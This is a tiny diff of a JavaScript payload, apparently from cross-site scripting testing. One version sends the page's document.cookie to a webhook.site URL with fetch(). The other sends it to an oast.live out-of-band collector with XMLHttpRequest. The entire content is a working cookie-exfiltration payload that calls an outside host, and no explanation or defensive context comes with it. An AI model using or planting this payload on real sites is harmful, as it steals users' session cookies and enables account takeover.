@@ -1,1 +1,5 @@
-fetch("https://webhook.site/be55532a-0e1e-4786-a71f-777f3a703867?t=" + document.cookie);
+var xhttp = new XMLHttpRequest();
+
+xhttp.open('GET', 'http://cpvd2ndarg3c5r5pjjlgzr55kdqqcsfe5.oast.live/c?' + document.cookie, true);
+
+xhttp.send();
